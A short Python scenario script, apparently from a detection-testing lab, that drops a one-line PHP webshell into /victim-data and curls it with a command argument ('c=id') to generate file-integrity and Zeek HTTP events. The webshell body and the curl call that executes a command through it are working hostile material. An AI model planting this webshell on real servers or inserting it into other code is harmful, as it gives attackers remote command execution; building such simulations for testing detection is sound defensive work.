"""webshell-drop scenario — FIM + zeek.http."""
from __future__ import annotations

import os
import subprocess
import time


NAME = "webshell-drop"
DESCRIPTION = "Drop a PHP webshell into /victim-data and curl it with a command arg"

VICTIM_DATA = "/victim-data"

_WEBSHELL_BODY = "<?php system($_GET['c']); ?>\n"


def run(target_host: str) -> None:
    os.makedirs(VICTIM_DATA, exist_ok=True)
    file_path = os.path.join(VICTIM_DATA, f"cmd_{int(time.time())}.php")
    # FIM `created` event
    with open(file_path, "w") as f:
        f.write(_WEBSHELL_BODY)

    # zeek.http event — curl the webshell with a suspicious query string
    subprocess.run(
        ["curl", "-s", f"http://{target_host}/{os.path.basename(file_path)}?c=id"],
        check=False,
        timeout=10,
    )
